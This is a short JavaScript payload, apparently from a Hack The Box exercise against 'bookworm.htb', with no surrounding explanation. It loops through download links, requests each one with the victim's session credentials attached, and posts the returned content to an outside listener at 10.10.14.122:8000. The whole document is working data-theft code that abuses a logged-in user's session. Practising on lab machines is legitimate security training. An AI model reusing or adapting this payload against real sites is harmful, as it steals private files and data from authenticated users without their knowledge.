for(let i = 1; i <= 30; i++)
{
fetch("http://bookworm.htb/download/"+i+"?bookIds=13", { mode: 'no-cors',
credentials: 'include'})
      .then((response) => response.text())
      .then((text) => {
        fetch("http://10.10.14.122:8000", { mode: 'no-cors', method:"POST", body:
text})
    });
}